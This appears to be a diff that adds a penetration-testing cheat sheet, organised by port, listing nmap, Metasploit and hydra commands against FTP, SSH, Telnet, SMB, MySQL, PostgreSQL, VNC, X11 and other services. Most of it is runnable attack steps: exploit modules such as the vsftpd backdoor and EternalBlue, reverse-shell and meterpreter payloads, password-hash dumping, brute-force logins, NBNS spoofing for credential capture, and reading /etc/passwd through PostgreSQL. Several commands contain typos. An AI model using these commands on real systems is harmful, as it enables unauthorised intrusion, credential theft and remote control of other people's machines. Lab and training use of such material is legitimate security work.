@@ -1,0 +1,625 @@
+Common Scripts : /usr/share/nmap/scripts/
+
+nmap google.com
+nmap XX.XX.XX.XX -sV
+nmap -sS -sV -p21 <target> --script ftp-anon
+nmap -sV -p21 -sC -A 10.10.10.10
+
+common ports : 21, 22, 23, 25, 53, 80, 111, 139, 445, 513, 514, 1099, 1524, 2049, 2121, 3306, 5432, 5900, 6000, 6667, 8009, 8180 
+Common Ports : 20, 21, 22, 23, 25, 53, 67, 68, 69, 80, 110, 119, 123, 143, 161, 162, 179, 194, 443, 445, 465, 514, 516, 520, 530, 543, 544, 587, 631, 636, 873, 990, 993, 995, 1080, 1433, 1434, 1521, 2049, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 8888
+
+-----Port 20 21:FTP:
+
+msfconsole
+use auxiliary/scanner/ftp/ftp_version
+run
+services -p 21
+searchploit vsftp
+grep vsftp search exploits
+use exploit/unix/ftp/vsftp_234_backdoor
+show info
+run
+sessions -l
+
+msfconsole
+search vsftpd 2.3.4
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS <target ip>
+show payloads
+exploit
+
+msfconsole
+use post/linux/gather/hashdump
+show options
+set SESSION 2
+show info
+run
+
+nmap -p 21 --script=ftp-anon.nse XX.XX.XX.XX
+nmap -p 21 --script=ftp-syst.nse XX.XX.XX.XX
+nmap -p 21 --script=ftp-vsftd-backdoor.nse XX.XX.XX.XX
+nmap -p 21 --script ftp-* XX.XX.XX.XX
+
+ftp XX.XX.XX.XX
+
+wget -m ftp://anonymous:anonymous@XX.XX.XX.XX
+wget -m --no-passive ftp://anonymous:anonymous@XX.XX.XX.XX
+
+BruteForce : hydra -l username -P passwords.txt XX.XX.XX.XX
+
+-----Port 22:SSH:
+nmap -sV -p22 192.168.1.103
+ssh username@XX.XX.XX.XX
+
+auxiliary/scanner/ssh/ssh_login
+auxiliary/scanner/ssh/ssh_login_pubkey
+
+msfconsole
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS XX.XX.XX.XX
+set USERPASS_FILE root_userpass.txt
+set VERBOSE false
+run
+
+msfconsole
+use auxiliary/scanner/ssh/ssh_login_pubkey
+set KEY_FILE /tmp/r00tprivatekey
+set USERNAME root
+set RHOSTS 10.0.0.27
+run
+sessions -i 1
+
+id
+uname -a
+whoami
+pwd
+
+msfconsole
+use exploit/multi/ssh/sshexec
+set rhosts XX.XX.XX.XX
+set payload linux/x86/meterpreter/reverse_tcp
+set username pentest
+set password 123
+show targets
+set target 1
+exploit
+
+nmap -p22 <ip> -sC
+nmap -p22 <ip> -sV
+nmap -p22 <ip> --script ssh2-enum-algos
+nmap -p22 <ip> --script ssh-hostkey --script-args ssh_hostkey=full
+nmap -p22 <ip> --script ssh-auth-methods --script-args="ssh.user=root"
+
+WordList:
+https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt
+https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt
+https://github.com/pentestmonkey/yaptest/blob/master/ssh-usernames.txt
+
+BruteForce: hydra -L users.txt -P pass.txt XX.XX.XX.XX ssh
+Login : ssh username@XX.XX.XX.XX
+
+msfconsole
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS XX.XX.XX.XX
+info
+show options
+set USER_FILE user_list.txt
+set PASS_FILE pass_list.txt
+set STOP_ON_SUCCESS true
+set VERBOSE true
+show options
+exploit
+sessions -u
+sessions -u 1
+sessions 2
+arp -a
+
+msfconsole
+use auxiliary/scanner/ssh/ssh_login_pubkey
+show info
+show options
+ssh-keygan
+set KEY_PATH id_rsa.pub
+set USERNAME root
+set RHOSTS XX.XX.XX.XX
+exploit
+
+hydra -L users.txt -P pass.txt -t 8 XX.XX.XX.XX ssh
+ssh user@XX.XX.XX.XX
+
+nmap -p 22 --script=ssh-brute.nse XX.XX.XX.XX
+nmap -p 22 --script=ssh* XX.XX.XX.XX
+
+-----Port 23:Telnet:
+
+telnet XX.XX.XX.XX 23
+nmap -p 23 X.X.X.X
+
+nc -vn XX.XX.XX.XX 23
+nmap -n -sV -Pn --script=telnet* -p 23 XX.XX.XX.XX
+nmap -p 23 --script telnet-encrpytion X.X.X.X
+nmap -p 23 --script telnet-ntlm-info X.X.X.X
+nmap -p 23 --script telnet-brute X.X.X.X
+
+msfconsole
+use auxiliary/scanner/telnet/telnet_version
+show options
+set RHOSTS 192.168.1.0/24
+set THREADS 254
+run
+
+msfconsole
+use auxiliary/scanner/telnet/telnet_login
+show options
+set BLANK_PASSWORDS false
+set PASS_FILE passwords.txt
+set RHOSTS 192.168.1.0/24
+set THREADS 254
+set USER_FILE users.txt
+set VERBOSE false
+run
+season -l
+sessions -i 1
+
+msfconsole
+use auxiliary/scanner/telnet/telnet_login
+set rhosts X.X.X.X
+set user_file /path/to/user.txt
+set pass_file /path/to/pass.txt
+set stop_on_success true
+exploit
+
+msfconsole
+use auxiliary/scanner/telnet/telnet_login
+info
+show options
+set RHOSTS X.X.X.X
+set USERPASS_FILE ssh_userpass.txt
+run
+sessions
+sessions 1
+whoami
+sudo su
+
+msfconsole
+use auxiliary/scanner/telnet/telnet_version
+info
+show options
+set rhosts X.X.X.X
+run
+sessions
+
+telnet X.X.X.X
+ncrack -V -p 23 -U user_list.txt -P pass_list.txt X.X.X.X
+nmap -p 23 --script=telnet-brute.nse X.X.X.X
+nmap -p 23 --script=telnet-brute.nse --script=args "userdb=user_list,passdb=pass_list.txt,telnet=brute,timeout=4s" X.X.X.X -v -d
+nmap -p 23 --script=telnet* X.X.X.X
+
+Bruteforce : hydra -l root -P passwords.txt [-t 32] XX.XX.XX.XX telnet
+
+FTP(21), Telnet(23), PortgreSql(5432), SSH(22), RDP(3389), VNC(5900) BruteForce : https://github.com/R0ckNRolla/BruteDum
+
+git clone https://github.com/R0ckNRolla/BruteDum
+cd BruteDum
+python3 brutedum.py
+
+-----Port 25:TCP:
+
+nmap -p 25 -sC -sV -A XX.XX.XX.XX
+
+msfconsole
+search smtp
+use auxiliary/scanner/smtp/smtp_version
+services -p 25
+
+msfconsole
+search smtp
+use auxiliary/scanner/smtp/smtp_enum
+show options
+set RHOSTS XX.XX.XX.XX
+set VERBOSE true
+run
+
+msfconsole
+use auxiliary/scanner/smtp/smtp_enum
+info
+show options
+set RHOSTS XX.XX.XX.XX
+run
+
+use auxiliary/scanner/smtp/smtp_version
+set RHOSTS XX.XX.XX.XX
+run
+
+nc XX.XX.XX.XX 25
+telnet XX.XX.XX.XX 25
+nmap -p 25 --script=smtp-enum-users.nse XX.XX.XX.XX
+nmap -p 25 --script=vuln XX.XX.XX.XX -d -v
+nmap -p 25 --script=smtp* XX.XX.XX.XX
+nmap -p 25 --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 XX.XX.XX.XX
+
+-----Port 80:Http:
+
+msfconsole
+search twiki
+use exploit/unix/webapp/twiki_history
+show options
+set RHOSTS X.X.X.X
+set payload cmd/unix/reverse
+show options
+set LHOSTS X.X.X.X
+show options
+run
+sessions 1
+sessions 2
+
+use post/multi/manage/shell_to_meterpreter
+show options
+set SESSION 1
+run
+
+msfconsole
+search http/php
+use exploit/multi/http/php_cgi_arg_injection
+info
+show options
+set RHOSTS X.X.X.X
+run
+
+nmap -p 80 --script=http-date X.X.X.X
+nmap -p 80 --script=http-brute X.X.X.X
+nmap -p 80 --script=http* X.X.X.X
+
+-----Port 111:tcp rpc:
+
+nmap -sC -sV -oA scan X.X.X.X
+rpcinfo -p X.X.X.X
+rpcinfo -p X.X.X.X | grep nfs
+showmount -e X.X.X.X
+rpcenum -v X.X.X.X
+
+msfconsole
+use auxiliary/gather/rpcbind_cgi_mainenv
+set RHOST X.X.X.X
+run
+
+nmap -p 111 --script=rpcap-brute X.X.X.X
+nmap -p 111 --script=rpcap-info X.X.X.X
+nmap -p 111 --script=rpc* X.X.X.X
+
+-----Port 139,445:tcp samba:
+
+nmap -sV -p 139,445 X.X.X.X
+nmap -p 139,445 -A X.X.X.X
+nmap --script smb-vuln* -p 139,445 X.X.X.X
+
+msfconsole
+use auxiliary/scanner/smb/smb_version
+show options
+set RHOST X.X.X.X
+run
+searchspoilt samba | grep X.X.X
+
+msfconsole
+use exploit/multi/samba/username_map_script
+show options
+set rhost X.X.X.X
+run
+
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set rhost X.X.X.X
+exploit
+
+msfconsole
+use auxiliary/scanner/smb/smb_enumusers
+set rhosts X.X.X.X
+set smbuser raj
+set smbpass 123
+exploit
+
+msfconsole
+use exploit/windows/smb/psexec
+set rhost X.X.X.X
+set smbuser raj
+set smbpass 123
+exploit
+
+msfconsole
+use exploit/windows/smb/smb_delivery
+set srvhost X.X.X.X
+exploit
+
+msfconsole
+use auxiliary/server/capture/smb
+set johnpwfile /root/Desktop/
+exploit
+
+msfconsole
+use auxiliary/spoof/nbns/nbns_response
+set srvhost 192.168.1.109
+set johnpwfile /root/Desktop/
+exploit
+
+msfconsole
+use auxiliary/spoof/nbns/nbns_response
+set spoofip 192.168.1.109
+set interface eth0
+exploit
+
+msfconsole
+use exploit/multi/samba/usermap_script
+set rhosts X.X.X.X
+exploit
+
+msfconsole
+use auxiliary/scanner/smb/smb_enumusers
+set rhosts X.X.X.X
+nmap -p 445 --script=samba-vuln-cve* X.X.X.X
+
+hydra -L user.txt -P pass.txt X.X.X.X smb
+
+-----Port 512,513.514:RSH:
+
+nmap -sV -p 512,513,514 X.X.X.X
+
+msfconsole
+use auxiliary/scanner/rservices/rexec_login
+info
+options
+set RHOSTS XX.XX.XX.XX
+set STOP_ONN_SUCCESS true
+set USERPASS_FILE ssh_userpass.txt
+exploit
+
+msfconsole
+use auxiliary/scanner/rservices/rlogin_login
+options
+set RHOSTS XX.XX.XX.XX
+exploit
+
+rlogin XX.XX.XX.XX
+sudo rlogin XX.XX.XX.XX
+rlogin -l root XX.XX.XX.XX
+nmap -p 512,513,514 --script=rexec-brute XX.XX.XX.XX
+nmap -p 512,513,514 --script=rexec* XX.XX.XX.XX
+
+-----Port 1099:tcp java-rmi:
+
+nmap -sT -p 1099 -sV XX.XX.XX.XX
+nmap -sV --script=rmi* -p XX.XX.XX.XX 1099
+
+msfconsole
+search java_rmi
+use exploit/multi/misc/java_rmi_server
+show options
+set RHOSTS XX.XX.XX.XX
+set threads 16
+exploit
+pwd
+ls -la
+ifconfig
+
+msfconsole
+use exploit/multi/misc/java_rmi_server
+options
+set rhost XX.XX.XX.XX
+show payloads
+set payload java/meterpreter/reverse_tcp
+options
+set lhost XX.XX.XX.XX
+run
+
+-----Port 1524:tcp bindshell:
+sudo nc XX.XX.XX.XX 1524
+ls
+sudo telnet XX.XX.XX.XX 1524
+ls
+
+-----Port 2049:tcp nfs:
+rpcinfo -p XX.XX.XX.XX
+
+-----Port 3306:tcp mysql:
+
+mysql -u root -p -h 192.168.56.101
+
+apt install mysql-server
+netstat -tlnp
+nmap -p3306 -sV XX.XX.XX.XX
+
+msfconsole
+use auxiliary/scanner/mysql/mysql_version
+info
+set RHOSTS XX.XX.XX.XX
+exploit
+
+msfconsole
+use auxiliary/scanner/mysql/mysql_login
+info
+set RHOSTS XX.XX.XX.XX
+set STOP_ON_SUCCESS true
+set USERPASS_FILE ssh_userpass.txt
+exploit
+
+msfconsole
+use auxiliary/scanner/mysql/mysql_hashdump
+info
+set RHOSTS XX.XX.XX.XX
+set USERNAME root
+run
+
+mysql -u root -p -h XX.XX.XX.XX
+nmap -p 3306 --script=mysql-empty-password XX.XX.XX.XX
+nmap -p 3306 --script=mysql-database XX.XX.XX.XX
+nmap -p 3306 --script=mysql* XX.XX.XX.XX
+
+-----Port 5432:tcp postgresql:
+
+nmap -p5432 XX.XX.XX.XX
+
+msfconsole
+use auxiliary/scanner/postgres/postgres_version
+info
+set RHOSTS XX.XX.XX.XX
+info
+exploit
+
+msfconsole
+search postgresql
+use auxiliary/scanner/postgres/postgres_login
+show options
+set BRUTEFORCE_SPEED 10
+set RHOSTs XX.XX.XX.XX
+set STOP_ON_SUCCESS true
+set VERBOSE true
+run
+set BRUTEFORCE_SPEED 5
+run
+
+msfconsole
+use exploit/linux/postgres/postgres_payload
+show options
+set RHOST XX.XX.XX.XX
+set VERBOSE true
+show options
+run
+
+msfconsole
+use auxiliary/admin/postgres/postgres_readfile
+set rhosts XX.XX.XX.XX
+set rfile /etc/passwd
+set password 123
+exploit
+
+msfconsole
+use auxiliary/admin/postgres/postgres_sql
+set rhosts XX.XX.XX.XX
+set username ignite
+set password 123
+exploit
+
+msfconsole
+use auxiliary/scanner/postgres/postgres_hashdump
+set rhosts XX.XX.XX.XX
+set username postgres
+set password 123
+exploit
+
+msfconsole
+use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
+set rhosts XX.XX.XX.XX
+set lhost XX.XX.XX.XX
+set username postgres
+set password 123
+exploit
+run
+sessions
+sessions -u 1
+sessions 2
+
+msfconsole
+use auxiliary/scanner/postgress/progress_dname_flag_injection
+info
+set RHOSTS XX.XX.XX.XX
+exploit
+
+hydra -L user.txt -P pass.txt XX.XX.XX.XX postgres
+psql -h XX.XX.XX.XX -U postgres
+
+-----Port 5900:tcp vnc:
+nmap -p 5900 script=vnc-brute XX.XX.XX.XX
+nmap -p 5900 script=vnc* XX.XX.XX.XX
+
+msfconsole
+use auxiliary/scanner/vnc/vnc_none_auth
+set RHOSTS 192.168.56.10
+exploit
+
+msfconsole
+search vnc
+use auxiliary/scanner/vnc/vnc_login
+show options
+set RHOSTS 192.168.56.10
+show options
+run
+vncviewer
+
+msfconsole
+search vnc
+use auxiliary/scanner/vnc/vnc_login
+show options
+set RHOSTS 192.168.56.10
+set USER_FILE user_list.txt
+run
+
+-----Port 6000:tcp x11:
+msfconsole
+use auxiliary/scanner/x11/open_x11
+info
+set RHOSTS XX.XX.XX.XX
+exploit
+
+msfconsole
+use auxiliary/scanner/x11/x11_keyboard_exec
+info
+set RHOSTS XX.XX.XX.XX
+show payloads
+set payload cmd/unix/reverse_awk
+exploit
+set LHOST XX.XX.XX.XX
+exploit
+
+nmap -p 6000 --script=x11* XX.XX.XX.XX
+
+More Links :
+https://www.hackingarticles.in
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
